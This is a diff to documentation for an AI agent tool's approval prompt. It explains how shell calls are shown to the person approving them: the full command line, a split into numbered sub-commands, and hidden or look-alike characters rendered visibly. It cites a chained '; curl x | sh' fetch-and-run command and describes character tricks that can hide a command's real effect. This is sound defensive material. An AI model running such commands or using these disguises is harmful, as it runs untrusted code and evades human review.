@@ -244,6 +244,38 @@ say which command it exempts; write the command out
 [configuration.md](../configuration.md#primary-file--configtoml) for the guard's
 settings.
 
+### What the prompt shows
+
+A call that needs approval shows its arguments, redacted. A shell call
+(`run_command`, `monitor` with `kind=command`) shows more, because one line
+can run several commands and its text can hide what it does
+(`evi/approval.py`):
+
+- **The whole line.** It is never cut short (a chained `; curl x | sh` past
+  the cut would go unseen); past 20,000 characters it is cut, and the prompt
+  says how many characters are missing and to deny unless you know what
+  they are.
+- **Each command it runs**, numbered, on a line of its own, when there is
+  more than one. A substitution (`$( )`, backticks, a subshell) is listed
+  indented under the command it is in. The list comes from the same
+  splitter rules are matched with, so it is what each rule checks. A line
+  the splitter can't follow (`bash -c '…'`, an unbalanced quote) says so:
+  read it whole.
+- **Hidden characters, made visible.** A bidi override (which reorders the
+  text after it), a zero-width or tag character, a control character (an
+  escape sequence, a carriage return), a space other than the ASCII one,
+  and the curly quotes and en and em dashes PowerShell reads as `'`, `"`
+  and `-` are each shown as their `\u` escape, and a warning names each kind
+  (`U+202E RIGHT-TO-LEFT OVERRIDE`). A newline shows as `\u000a` in the line,
+  since it separates commands. Any other call's arguments get the same
+  escapes.
+- **The call's other arguments** (`cwd`, `timeout`) on a line of their own.
+
+The CLI's prompts (one call, and a batch), the web UI's card and the VS Code
+panel all show this. The web stream's `PermissionRequest` event carries it
+as `shell`: `{command, segments: [{depth, text}], hidden, note, cut, rest}`,
+or `null` for a call that runs no shell command.
+
 ### Protected paths
 
 Protected paths keep a prompt-injected agent from silently rewriting the files
@@ -1357,6 +1389,8 @@ turn returns to your normal policy.
   checks.
 - `C:\evi\evi\shellsplit.py` — splits a shell line into the commands rules are
   matched against.
+- `C:\evi\evi\approval.py` — what an approval prompt shows of a shell call
+  (`describe`, `visible`, `hidden_characters`).
 - `C:\evi\evi\shell_guard.py` — the destructive-command guard, and the director
   rules (`director_hit`, `director_code_hit`).
 - `C:\evi\evi\attest.py` — the director's key and attestations, and who may
